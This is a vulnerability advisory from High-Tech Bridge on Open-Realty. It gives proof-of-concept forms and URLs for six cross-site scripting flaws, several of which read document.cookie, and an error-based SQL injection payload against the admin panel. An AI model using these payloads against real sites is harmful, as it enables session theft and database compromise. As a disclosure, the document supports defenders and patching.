Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Open-Realty, which can be exploited to perform cross-site scripting and SQL Injection attacks.

1) Input passed via the "name", "email", "friend_email", "subject", "message" POST parameters to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:


<form action="http://[host]/index.php?action=contact_friend&popup=yes&listing_id=1" method="post">
<input type="hidden" name="name" value='"><script>alert(1);</script>'>
<input type="hidden" name="email" value='"><script>alert(2);</script>'>
<input type="hidden" name="friend_email" value='"><script>alert(3);</script>'>
<input type="hidden" name="subject" value='"><script>alert(4);</script>'>
<input type="hidden" name="message" value='</textarea><script>alert(5);</script>'>
<input type="hidden" name="submit" value='send'>
<input name="send" value="EXPLOIT" type="submit">
</form>


2) Input passed via the "searchtext" GET parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?searchtext=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

3) Input passed via the "listing_id" GET parameter and "comments", "source" POST parameters to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:


<form action="http://[host]/index.php?action=contact_agent&listing_id=1<script>alert(1);</script> " method="post">
<input type="hidden" name="comments" value='<script>alert(2);</script>'>
<input type="hidden" name="formaction" value='create_new_lead'>
<input type="hidden" name="listingID" value='1'>
<input type="hidden" name="source" value='<script>alert(3);</script>'>
<input name="send" value="EXPLOIT" type="submit">
</form>


4) Input passed via the "path" GET parameter to /include/class/ckeditor/custom/filemanager/connectors/php/filemanager.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/include/class/ckeditor/custom/filemanager/connectors/php/filemanager.php?mode=getfolder&path=%3Cimg%20src=%221%22%20onerror=javascript:alert%28document.cookie%29;%3E

5) Input passed via the "type" GET parameter to /admin/index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/admin/index.php?action=edit_user_template&type=1%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

6) Input passed via the "query" POST parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:


<form action="http://[host]/index.php?action=save_search&printer_friendly= " method="post">
<input type="hidden" name="notify" value='no'>
<input type="hidden" name="title" value=''>
<input type="hidden" name="query" value='"><script>alert(document.cookie);</script>'>
<input name="send" value="EXPLOIT" type="submit">
</form>



7) Input passed via the "type" GET parameter to /admin/index.php is not properly sanitised before being used in SQL queries. 
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/admin/index.php?action=edit_user_template&type=min%28@a:=1%29from%20%28select%201%20union%20select%202%29k%20group%20by%20%28select%20concat%28@@version,0x0,@a:=%28@a%2B1%29%2%29%29%20--%202

Successful exploitation of this vulnerability requires permissions to access Admin Panel.
